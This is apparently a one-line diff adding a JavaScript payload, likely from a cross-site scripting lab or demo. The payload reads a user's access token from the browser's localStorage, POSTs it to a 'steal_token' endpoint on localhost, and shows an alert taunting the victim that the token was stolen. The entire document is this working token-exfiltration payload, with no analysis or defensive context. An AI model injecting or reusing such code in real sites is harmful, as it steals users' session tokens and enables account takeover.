@@ -1,0 +1,1 @@
+fetch('http://localhost:8001/dashboard/steal_token',{method: 'POST',headers: {'Accept': 'application/json','Content-Type': 'application/json'},body: JSON.stringify({ 'stolentoken': window.localStorage.usertoken })}).then(alert('HAHA, your access token was stolen by me! Please check out your Twitter!'));
